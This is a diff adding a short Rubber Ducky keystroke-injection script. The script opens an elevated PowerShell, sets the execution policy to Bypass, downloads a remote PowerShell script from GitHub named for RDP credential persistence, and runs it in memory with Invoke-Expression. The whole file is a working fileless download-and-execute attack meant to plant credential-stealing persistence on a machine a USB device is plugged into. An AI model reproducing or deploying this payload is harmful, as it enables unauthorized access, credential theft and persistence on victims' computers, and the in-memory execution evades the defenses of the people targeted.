@@ -1,0 +1,29 @@
+# REM this ducky script bypass script Prevention from running ,after that is loads to  the RAM the github script and in 
+# the end   run the script in the RAM.
+
+
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell.exe -Command "Start-Process powershell.exe -Verb RunAs"
+DELAY 500
+ENTER 
+DELAY 1000
+STRING Set-ExecutionPolicy Bypass -Force
+DELAY 1000
+ENTER
+DELAY 1000
+STRING $ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/Tamirmaidani/Rdp_cred-s-presistence/main/RDP_INFULTRETOR.ps1
+DELAY 1000
+ENTER
+DELAY 2000
+STRING Invoke-Expression $($ScriptFromGitHub.Content)
+DELAY 1000
+ENTER
+DELAY 3000
+STRING exit
+DELAY 500
+ENTER
+
+
+
